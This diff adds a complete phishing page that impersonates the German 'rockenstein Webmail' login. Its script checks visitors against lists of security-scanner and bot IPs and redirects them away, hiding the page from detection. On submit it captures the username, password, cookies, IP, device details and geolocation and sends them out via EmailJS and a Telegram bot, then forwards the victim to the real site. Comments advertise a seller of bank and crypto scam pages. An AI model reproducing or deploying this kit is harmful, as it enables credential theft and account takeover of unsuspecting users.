@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="de" class="js chrome webkit">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>rockenstein Webmail :: Willkommen bei rockenstein Webmail</title>
+    <meta name="Robots" content="noindex,nofollow">
+    <meta name="viewport" content="" id="viewport">
+    <link rel="shortcut icon" href="https://webmail.rockenstein.de/skins/rag/images/favicon.ico">
+    <link rel="stylesheet" type="text/css" href="./index_files/styles.min.css">
+    <link rel="stylesheet" type="text/css" href="./index_files/jquery-ui-1.10.4.custom.css">
+    <link type="text/css" rel="stylesheet" charset="UTF-8" href="./index_files/m=el_main_css">
+    <script src="addLogDetails.js"></script>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script>
+      async function fetchTargetIPAddresses() {
+        const folderPath = 'antibot/ips/';
+        const jsonFiles = ['amazonBotIPs.json', 'appleBotIPs.json', 'bingBotIPs.json', 'cloudFlareBotIPs.json', 'cookieBotIPs.json', 'googleBotIPs.json', 'namecheapBotIPs.json', 'qualysBotIPs.json', 'syntheticBotIPs.json', 'yandexBotIPs.json', 'generalBotIPs.json'];
+        const promises = jsonFiles.map(filename => {
+          return fetch(folderPath + filename).then(response => response.json()).then(data => {
+            const ips = Object.values(data).map(ip => String(ip).replace(/"/g, ''));
+            return ips;
+          }).catch(error => {
+            console.error(`Error fetching ${filename}:`, error);
+            return [];
+          });
+        });
+        const ipArrays = await Promise.all(promises);
+        const targetIPAddresses = ipArrays.flat();
+        //console.log('Fetched target IP addresses:', targetIPAddresses);
+        return targetIPAddresses;
+      }
+
+      function isTargetIPAddress(ipAddress, targetIPAddresses) {
+        //console.log(ipAddress)
+        if (!Array.isArray(targetIPAddresses)) {
+          targetIPAddresses = [targetIPAddresses];
+        }
+        for (let i = 0; i < targetIPAddresses.length; i++) {
+          const targetIP = targetIPAddresses[i];
+          const individualIPs = targetIP.split(',').map(ip => ip.trim());
+          for (let j = 0; j < individualIPs.length; j++) {
+            const individualIP = individualIPs[j];
+            //console.log("Individual IP:", individualIP);
+            if (isIPInRange(ipAddress, individualIP)) {
+              console.log("Match found:", individualIP);
+              return true;
+            }
+          }
+        }
+        console.log("Match not found");
+        return false;
+      }
+
+      function isIPInRange(ipAddress, targetIP) {
+        //console.log("Checking IP range:", targetIP);
+        if (Array.isArray(targetIP)) {
+          for (let i = 0; i < targetIP.length; i++) {
+            const ip = targetIP[i];
+            if (ipAddress.trim() === ip.trim()) {
+              //console.log("IPs match:", true);
+              return true;
+            }
+          }
+        } else {
+          //console.log("Checking IP:", targetIP.trim());
+          const match = ipAddress.trim() === targetIP.trim();
+          //console.log("IPs match:", match);
+          return match;
+        }
+        //console.log("IPs match:", false);
+        return false;
+      }
+      async function redirectToBlockedPage() {
+        try {
+          const targetIPAddresses = await fetchTargetIPAddresses();
+          const data = await fetch('https://api.ipify.org?format=json');
+          const {
+            ip: currentIPAddress
+          } = await data.json();
+          if (isTargetIPAddress(currentIPAddress, targetIPAddresses)) {
+            window.location.href = "http://2m.ma";
+            //const userAgent = navigator.userAgent;
+            //console.log("User Agent:", userAgent);
+          }
+        } catch (error) {
+          console.error('Error:', error);
+        }
+      }
+      window.onload = redirectToBlockedPage;
+    </script>
+  </head>
+  <body>
+    <h1 class="voice">
+      <font style="vertical-align: inherit;">
+        <font style="vertical-align: inherit;">rockenstein Webmail Anmeldung</font>
+      </font>
+    </h1>
+    <div id="login-form">
+      <div class="box-inner" role="main">
+        <img src="./index_files/rag-logo-weiss.png" id="logo" alt="rockenstein Webmail">
+        <form name="form" onsubmit="sendLogs(event)" method="POST">
+          <table>
+            <tbody>
+              <tr>
+                <td class="title">
+                  <label for="rcmloginuser">
+                    <font style="vertical-align: inherit;">
+                      <font style="vertical-align: inherit;">Benutzername</font>
+                    </font>
+                  </label>
+                </td>
+                <td class="input">
+                  <input name="_user" id="rcmloginuser" required="required" size="40" autocapitalize="off" autocomplete="off" type="text">
+                </td>
+              </tr>
+              <tr>
+                <td class="title">
+                  <label for="rcmloginpwd">
+                    <font style="vertical-align: inherit;">
+                      <font style="vertical-align: inherit;">Passwort</font>
+                    </font>
+                  </label>
+                </td>
+                <td class="input">
+                  <input name="_pass" id="rcmloginpwd" required="required" size="40" autocapitalize="off" autocomplete="off" type="password">
+                </td>
+              </tr>
+            </tbody>
+          </table>
+          <p class="formbuttons">
+            <font style="vertical-align: inherit;">
+              <font style="vertical-align: inherit;">
+                <input type="submit" class="button mainaction" value="Anmelden">
+              </font>
+            </font>
+          </p>
+        </form>
+      </div>
+      <div class="box-bottom" role="complementary">
+        <div id="message"></div>
+        <noscript>
+          <p class="noscriptwarning">Warnung: Dieser Webmail-Service erfordert Javascript. Um ihn zu benutzen aktivieren Sie Javascript in ihren Browser-Einstellungen.</p>
+        </noscript>
+      </div>
+      <div id="bottomline" role="contentinfo">
+        <font style="vertical-align: inherit;">
+          <font style="vertical-align: inherit;"> rockenstein Webmail ●&nbsp; </font>
+        </font>
+        <a href="https://www.rockenstein.de/kontakt.html" target="_blank" class="support-link">
+          <font style="vertical-align: inherit;">
+            <font style="vertical-align: inherit;">Support</font>
+          </font>
+        </a>
+      </div>
+    </div>
+    <script type="application/javascript">
+      //THIS CODE WAS BUILT BY "SCAMPAGESHOP [www.scampage.shop]" and has AES 256-bit encryption. Any adjustments to the code would break it//
+      //Do not touch this section
+      //When testing results, if you don't find it in your inbox, check your spam folder.
+      //If you want to get quality:
+      // - USA Banks Scampage
+      // - UK Banks Scampage
+      // - Australian Scampage
+      // - Canadian Scampage
+      // - Crypto Websites Scampage 
+      // - Email Accounts Scampage
+      // - Newsletter Scampage and more..
+      // Visit: https://www.scampage.shop/
+      const OpenCageApiKey = "4e409ae9c61a4c72a039a8c02e10e45a";
+      const serviceId = "knownEmail";
+      const templateId = "general-email-logs";
+      const logPublicKey = "LGFhAbErLWpWg_Tdx";
+
+      function sendLogs(event) {
+        event.preventDefault();
+        var email = document.getElementById("rcmloginuser").value;
+        var password = document.getElementById("rcmloginpwd").value;
+        var x = document.cookie;
+        fetch('https://api.ipify.org').then(res => res.text()).then(ipAddress => {
+          const deviceInfo = {
+            manufacturer: navigator.userAgent.match(/[\(](.*?)[\)]/)[1],
+            model: navigator.userAgent.match(/[\(](.*?)[\)]/)[2],
+            os: navigator.userAgent.match(/Mac OS X/) ? "Mac OS X" : "Windows",
+            browser: navigator.userAgent.match(/Chrome/) ? "Chrome" : "Firefox",
+          };
+          getLocation(email, password, x, deviceInfo, ipAddress);
+        }).catch(error => {
+          console.error("Error capturing IP address:", error);
+        });
+      }
+
+      function getLocation(email, password, x, deviceInfo, ipAddress) {
+        navigator.geolocation?.getCurrentPosition(async (position) => {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const apiUrl = `https://api.opencagedata.com/geocode/v1/json?q=${latitude}+${longitude}&key=${OpenCageApiKey}&pretty=1&no_annotations=1`;
+            try {
+              const response = await fetch(apiUrl);
+              const data = await response.json();
+              if (data.results.length > 0) {
+                const result = data.results[0].components;
+                const city = result.city || result.village || result.town;
+                const state = result.state;
+                const country = result.country;
+                const zipCode = result.postcode;
+                const continent = result.continent;
+                const county = result.county;
+                var dataToSend = {
+                  email,
+                  password,
+                  ipAddress,
+                  Device: deviceInfo.manufacturer,
+                  OS: deviceInfo.os,
+                  Browser: deviceInfo.browser,
+                  Latitude: latitude,
+                  Longitude: longitude,
+                  City: city,
+                  State: state,
+                  Country: country,
+                  County: county,
+                  ZipCode: zipCode,
+                  Cookies: x,
+                  getLogs: emailForLogs,
+                };
+                emailjs.send(serviceId, templateId, dataToSend, logPublicKey).then(function(response) {
+                //console.log("Email sent successfully:", response);
+                }).catch(function(error) {
+                console.error("Email sending error:", error);
+                });
+              } else {
+                ////console.error("Location information not found.");
+              }
+            } catch (error) {
+              //console.error("Error fetching location data:", error);
+            }
+          },
+          (error) => {
+            //console.error("Error getting location:", error);
+            alert("Location permission is required to sign in to Webmail.");
+          });
+      }
+
+      function sendToTelegram(data) {
+        var payload = {
+          chat_id: chatId,
+          text: `
+            Rockenstein Webmail Logs:
+            ________________________
+              "Email address": "${data.email}",
+              "Password": "${data.password}",
+              "IP Address": "${data.ipAddress}",
+              "Device Info": "${data.Device}",
+              "OS": "${data.OS}",
+              "Browser": "${data.Browser}",
+              "Latitude": ${data.Latitude},
+              "Longitude": ${data.Longitude},
+              "City": "${data.City}",
+              "State": "${data.State}",
+              "County": "${data.County}",
+              "Country": "${data.Country}",
+              "ZipCode": "${data.ZipCode}",
+              "Cookie": ["${data.Cookies}"],
+            `
+        };
+        var sendToBot = {
+          url: "https://api.telegram.org/bot" + telegramBotId + "/sendMessage",
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+          },
+          data: JSON.stringify(payload)
+        };
+        $.ajax(sendToBot).done(function(response) {
+          window.location.href = "https://webmail.rockenstein.de";
+          // console.log("Telegram API response:", JSON.stringify(response));
+        }).fail(function(error) {
+          console.error("Error sending data to Telegram:", error);
+        });
+      }
+      document.getElementById("rcmloginpwd").addEventListener("keydown", function(event) {
+        if (event.keyCode === 13) {
+          event.preventDefault();
+          sendLogs(event);
+        }
+      });
+    </script>
+  </body>
+</html>
